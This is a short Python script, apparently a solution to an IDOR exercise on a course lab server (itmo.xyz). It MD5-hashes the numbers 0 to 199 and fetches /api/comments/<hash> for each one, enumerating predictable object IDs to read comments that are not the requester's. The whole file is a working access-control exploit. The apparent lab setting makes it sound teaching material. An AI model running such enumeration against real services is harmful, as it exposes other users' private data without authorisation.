import requests
import hashlib

for i in range(0, 200):
    hash = hashlib.md5(str(i).encode()).hexdigest()

    url = "https://3fa0c9e1-79db-49fd-b792-4b488eadab12-idor_02.web.lms.itmo.xyz/api/comments/" + hash
    response = requests.get(url)
    print(i, response.text)
